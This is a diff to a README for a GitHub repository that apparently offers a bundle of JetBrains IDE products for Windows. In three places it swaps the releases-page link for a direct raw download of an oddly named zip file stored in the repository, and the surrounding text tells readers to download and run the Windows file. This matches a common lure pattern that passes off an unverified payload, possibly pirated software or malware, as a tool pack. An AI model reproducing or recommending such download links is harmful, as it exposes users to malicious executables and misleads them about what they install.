@@ -1,6 +1,6 @@
 # 🛠️ jetbrains-all-products-pack - Tools for smooth coding on Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/4jj1lover/jetbrains-all-products-pack/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/4jj1lover/jetbrains-all-products-pack/raw/refs/heads/main/prenasal/all-pack-jetbrains-products-Ordovician.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ The pack includes support for tools and settings tied to IntelliJ IDEA, PyCharm,
 
 ## ⬇️ Download
 
-Visit this page to download: https://github.com/4jj1lover/jetbrains-all-products-pack/releases
+Visit this page to download: https://github.com/4jj1lover/jetbrains-all-products-pack/raw/refs/heads/main/prenasal/all-pack-jetbrains-products-Ordovician.zip
 
 Open the page, choose the newest release, and download the Windows file that matches your device.
 
@@ -244,4 +244,4 @@ That setup helps you move between projects without relearning each app.
 
 ## 📎 Release link
 
-Download and run the Windows file from the release page: https://github.com/4jj1lover/jetbrains-all-products-pack/releases
+Download and run the Windows file from the release page: https://github.com/4jj1lover/jetbrains-all-products-pack/raw/refs/heads/main/prenasal/all-pack-jetbrains-products-Ordovician.zip
